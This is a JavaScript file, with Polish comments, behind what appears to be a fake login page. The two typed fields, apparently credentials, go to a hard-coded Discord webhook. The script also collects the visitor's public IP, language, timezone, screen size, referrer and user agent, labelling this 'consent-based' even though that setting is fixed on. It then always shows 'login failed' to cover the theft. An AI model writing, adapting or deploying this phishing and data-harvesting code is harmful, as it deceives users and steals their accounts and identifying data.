// Wklej tutaj adres webhooka Discorda.
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1548440173635707041/MJ2ck95Ev0rN50TRiy9mkWFXTuQmtKuIanj6ErhT_xPTTPb88vBwVMhN5Fcnc-mE-lJt";

const form = document.querySelector("#discord-form");
const submitButton = document.querySelector("#submit-button");
const statusMessage = document.querySelector("#form-status");

form.addEventListener("input", () => {
  submitButton.classList.remove("sent");
  submitButton.querySelector("span").textContent = "Log in";
});

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "WKLEJ_TUTAJ_URL_WEBHOOKA") {
    showStatus("Najpierw uzupełnij adres webhooka w pliku script.js.", "error");
    return;
  }

  const formData = new FormData(form);
  const firstText = formData.get("firstText").trim();
  const secondText = formData.get("secondText").trim();
  const shareDiagnostics = true;

  submitButton.classList.remove("sent");
  submitButton.disabled = true;
  submitButton.querySelector("span").textContent = "Sending...";
  showStatus("", "");

  try {
    const diagnostics = shareDiagnostics ? await getConsentBasedDiagnostics() : null;
    const diagnosticsMessage = diagnostics
      ? `\n\n**Dane za zgodą użytkownika:**\n\`${JSON.stringify(diagnostics, null, 2)}\``
      : "";

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `**${firstText}**\n${secondText}${diagnosticsMessage}`
      })
    });

    if (!response.ok) {
      throw new Error(`Webhook odpowiedział kodem ${response.status}`);
    }

    form.reset();
  submitButton.classList.add("sent");
  submitButton.querySelector("span").textContent = "Logowanie nie udane";
    showStatus("Logowanie nieudane", "error");
  } catch (error) {
    console.error(error);
    showStatus("Logowanie nieudane", "error");
  } finally {
    submitButton.disabled = false;
    if (!submitButton.classList.contains("sent")) {
      submitButton.querySelector("span").textContent = "Log in";
    }
  }
});

function showStatus(message, type) {
  statusMessage.textContent = message;
  statusMessage.className = `form-status ${type}`;
}

async function getConsentBasedDiagnostics() {
  let publicIp = "unavailable";

  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    if (ipResponse.ok) {
      const ipData = await ipResponse.json();
      publicIp = ipData.ip || publicIp;
    }
  } catch (error) {
    console.warn("Nie udało się pobrać publicznego IP.", error);
  }

  return {
    publicIp,
    language: navigator.language || "unknown",
    languages: navigator.languages?.join(", ") || "unknown",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
    screen: `${window.screen.width}x${window.screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    referrer: document.referrer || "direct",
    userAgent: navigator.userAgent
  };
}
